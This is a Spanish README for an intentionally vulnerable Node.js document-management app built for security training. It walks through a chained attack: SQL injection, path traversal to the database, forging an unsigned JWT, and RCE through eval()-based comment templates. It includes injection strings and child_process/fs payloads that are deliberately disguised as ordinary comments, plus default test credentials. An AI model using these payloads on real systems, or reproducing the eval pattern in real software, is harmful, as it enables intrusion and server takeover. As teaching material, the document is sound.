# 📄 Gestor Docs G3

**Aplicación web para demostración de vulnerabilidades de seguridad**

---


⚠️ **ADVERTENCIA**: Esta aplicación contiene vulnerabilidades de seguridad **intencionalmente implementadas** para fines educativos. **NUNCA** usar en producción.

---

## 🎯 **Flujo de Ataque**

Esta aplicación demuestra una **cadena de vulnerabilidades** que permite escalar privilegios desde usuario básico hasta control total del servidor:

### **📋 Pasos del Ataque:**

**1. 🔍 SQL Injection (Information Disclosure)**
- **Punto de entrada**: Login con usuario básico
- **Técnica**: Inyectar SQL malicioso para generar errores
- **Objetivo**: Obtener la ruta de la base de datos del error

**2. 📂 Path Traversal**  
- **Técnica**: Descargar la base de datos usando rutas relativas
- **Objetivo**: Acceder al archivo `g3.db` con todos los usuarios
- **Herramienta**: Abrir con DBeaver o DB Browser para SQLite

**3. 🎫 JWT Inseguro**
- **Técnica**: Modificar el token JWT en las cookies del navegador
- **Objetivo**: Cambiar el ID de usuario por el ID del admin
- **Explotación**: Backend no valida correctamente la integridad del token

**4. 💥 RCE (Remote Code Execution)**
- **Técnica**: Inyección de JavaScript en sistema de comentarios
- **Objetivo**: Ejecutar código arbitrario en el servidor
- **Escalación**: Control total del sistema

### **🎓 Objetivo Educativo:**
Demostrar cómo **múltiples vulnerabilidades aparentemente menores** pueden combinarse para lograr un **compromiso total del sistema**.

---

## 🚀 **Instalación y uso**

### **Requisitos previos:**
- Node.js 16+ 
- npm

### **Pasos de instalación:**

1. **Clonar el repositorio:**
```bash
git clone https://github.com/tu-usuario/segweb-g3-gestor-documentos.git
cd segweb-g3-gestor-documentos
```

2. **Instalar dependencias:**
```bash
npm install
```

3. **Inicializar base de datos:**
```bash
npm run initdb
```

4. **Ejecutar la aplicación:**
```bash
npm start
```

5. **Acceder a la aplicación:**
```
http://localhost:3000
```

### **Usuarios de prueba:**
| Usuario     | Contraseña  | Rol   |
|-------------|-------------|-------|
| admin       | admin123    | admin |
| user        | user123     | user  |
| manager     | manager123  | user  |
| guest       | guest123    | user  |
| superadmin  | super123    | admin |

---

## 🔴 **VULNERABILIDADES IMPLEMENTADAS**

### **1. 💉 SQL Injection**

#### **🎯 Ubicación:**
- **Login** (`/api/auth/login`)

#### **📝 Descripción:**
Las consultas SQL utilizan concatenación directa de strings sin sanitización, permitiendo inyección de código SQL malicioso.

#### **💀 Payloads de explotación:**

**Login bypass:**
```sql
Usuario: admin'asd'
Contraseña: cualquiera
```

---

### **3. 🚨 Vulnerabilidad RCE (Remote Code Execution)**

#### **🎯 Ubicación:**
- Sistema de comentarios con plantillas dinámicas (`/api/comentarios`)

#### **📝 Descripción:**
El sistema de comentarios incluye una funcionalidad de **"referencias a usuarios"** que permite mencionar a otros usuarios que han interactuado con el documento. Los usuarios pueden usar variables como `{{uploader}}` para mencionar quien subió el archivo, `{{firstCommenter}}` para el primer comentarista, etc. Esta funcionalidad está implementada usando `eval()` para "flexibilidad", lo que permite la ejecución de código JavaScript arbitrario.


#### **💀 Explotación paso a paso:**

**Requisito:** Acceso como admin (solo admins pueden comentar)

**Paso 1: Iniciar sesión como admin**
- Usuario: `admin`
- Contraseña: `admin123`

**Paso 2: Ir a "Ver documentos"**
- Seleccionar cualquier archivo PDF
- Observar las instrucciones de plantillas dinámicas

**Paso 3: Explotar usando expresiones "matemáticas"**
- En lugar de un comentario normal, inyectar código malicioso

#### **💀 Payloads sutiles (disfrazados como referencias de usuarios):**

**Ejemplo 1: "Información del usuario del servidor" (reconocimiento)**
```
Gracias {{uploader}} por subirlo. Info técnica: {{process.platform}} {{process.version}}
```

**Ejemplo 2: "Validación del proceso" (identificación del usuario del servidor)**
```
Respondo a {{previousCommenter}} - Proceso verificado por: {{require('child_process').execSync('whoami').toString().trim()}}
```

**Ejemplo 3: "Listado de archivos relacionados" (enumeración)**
```
Como dice {{firstCommenter}}, archivos relacionados: {{require('fs').readdirSync('.').slice(0,3).join(', ')}}
```

**Ejemplo 4: "Log de actividad" (creación de evidencia)**
```
Seguimiento para {{uploader}}: {{require('fs').writeFileSync('activity.log', 'User accessed file: ' + new Date())}} ✓ Registrado
```

**Ejemplo 5: "Script de mantenimiento" (backdoor sutil)**
```
{{uploader}} necesita verificar esto: {{require('fs').writeFileSync('maint.bat', '@echo off\\necho Sistema OK\\nwhoami\\nhostname\\ndir')}}, ejecutando {{require('child_process').exec('maint.bat')}} ✓
```

#### **🎭 ¿Por qué estos payloads son especialmente sutiles?**

1. **Contexto conversacional**: Parecen respuestas normales a otros usuarios
2. **Referencias legítimas**: Usan las variables correctas como `{{uploader}}`, `{{previousCommenter}}`
3. **Flujo natural**: Se leen como comentarios reales de trabajo
4. **Justificación técnica**: Las "verificaciones" parecen parte del proceso normal
5. **Camuflaje perfecto**: Un admin usaría esto pensando que está mencionando usuarios

**Ejemplo real de ataque encubierto:**
```
Hola {{uploader}}, gracias por subir este documento importante.
{{previousCommenter}} tenía razón sobre la verificación.
Proceso completado: {{require('child_process').exec('powershell -c "Get-Process | Out-File processes.txt"')}} ✓
Sistema validado para {{firstCommenter}}: {{require('fs').writeFileSync('c:/temp/access.log', 'SYSTEM_ACCESS_' + Date.now())}} ✓
```

Este comentario parece una conversación normal pero ejecuta comandos maliciosos.

### **5. 📂 Vulnerabilidades de subida de archivos**

#### **🎯 Ubicación:**
- Endpoint `/api/documentos/upload`


### **6. 🌐 Exposición de información**

#### **🎯 Ubicación:**
- Búsqueda de usuarios devuelve contraseñas
- Logs del servidor muestran consultas SQL
- Errores de BD expuestos al frontend

#### **💀 Información expuesta:**
- Estructura de la base de datos
- Detalles técnicos en errores

---

### **7. 🔓 Vulnerabilidad JWT (JSON Web Token)**

#### **🎯 Ubicación:**
- Sistema de autenticación (`/backend/utils/jwt.js`)
- Middlewares de autenticación en todos los endpoints protegidos

#### **📝 Descripción:**
El sistema utiliza JWT para autenticación, pero la función de verificación tiene una vulnerabilidad crítica: **no verifica la firma del token**. Solo decodifica el JWT y verifica la estructura básica, permitiendo que tokens maliciosos sean aceptados como válidos.


---


### **PASO 1: 🔍 SQL Injection - Information Disclosure**

**Objetivo**: Obtener información sensible del sistema mediante errores SQL

**Procedimiento**:
1. Ir a `/login`
2. Usar usuario básico: `user` / `user123`
3. Interceptar la petición de login y modificar el username:
   ```
   Username: admin' OR '1'='1' UNION SELECT * FROM sqlite_master--
   ```
4. **Resultado**: Error SQL que expone:
   - Ruta de la base de datos: `backend/files/db/g3.db`
   - Estructura interna del servidor
   - Información de configuración

---

### **PASO 2: 📂 Path Traversal - Acceso a la Base de Datos**

**Objetivo**: Descargar la base de datos para análisis offline

**Procedimiento**:
1. Usar la ruta obtenida en el paso anterior
2. Acceder a: `/files/db/g3.db` o usar path traversal como `../files/db/g3.db`
3. Descargar el archivo `g3.db`
4. **Abrir con DBeaver o DB Browser for SQLite**
5. **Resultado**: Acceso a tabla `usuarios` con:
   - IDs de usuarios: `bdd96704ad0ad17e4cff8864e43a1686` (admin)
   - Usernames: `admin`, `user`
   - Contraseñas hasheadas (no útiles directamente)

---

### **PASO 3: 🎫 JWT Inseguro - Escalación de Privilegios**

**Objetivo**: Modificar el token JWT para obtener privilegios de admin

**Procedimiento**:
1. Hacer login con usuario básico (`user` / `user123`)
2. Abrir **Developer Tools** → **Application** → **Cookies**
3. Encontrar el token JWT en las cookies
4. **Decodificar el JWT** (usar jwt.io):
   ```json
   {
     "id": "id_del_usuario_basico",
     "username": "user",
     "rol": "user"
   }
   ```
5. **Modificar el payload**:
   ```json
   {
     "id": "bdd96704ad0ad17e4cff8864e43a1686",
     "username": "admin", 
     "rol": "admin"
   }
   ```
6. **Generar nuevo JWT** con la misma clave (o sin verificación)
7. **Reemplazar cookie** en el navegador
8. **Resultado**: Acceso como administrador

---

### **PASO 4: 💥 RCE - Ejecución Remota de Código**

**Objetivo**: Ejecutar código arbitrario en el servidor mediante comentarios

**Procedimiento**:
1. Con privilegios de admin, ir a **"Ver documentos"**
2. Seleccionar cualquier archivo PDF
3. En el sistema de comentarios, usar referencias con código malicioso:
   ```javascript
   Hola {{uploader}}, info del servidor: {{process.platform}} {{process.version}}
   ```
4. **Escalación a RCE completo**:
   ```javascript
   {{require('child_process').execSync('whoami').toString()}}
   ```
5. **Crear backdoor**:
   ```javascript
   {{require('fs').writeFileSync('backdoor.js', 'console.log("Server compromised!")')}}
   ```

---

### **🎯 RESULTADO FINAL**
- ✅ **Información sensible** obtenida via SQL Injection
- ✅ **Base de datos** descargada via Path Traversal  
- ✅ **Privilegios de admin** obtenidos via JWT manipulation
- ✅ **Control total del servidor** via RCE en comentarios

### **📚 LECCIONES APRENDIDAS**
1. **Múltiples vulnerabilidades menores** pueden combinarse para ataques devastadores
2. **Information Disclosure** en errores puede exponer infraestructura crítica
3. **Tokens inseguros** permiten escalación trivial de privilegios
4. **Input validation** insuficiente en funcionalidades "seguras" puede ser explotado

---


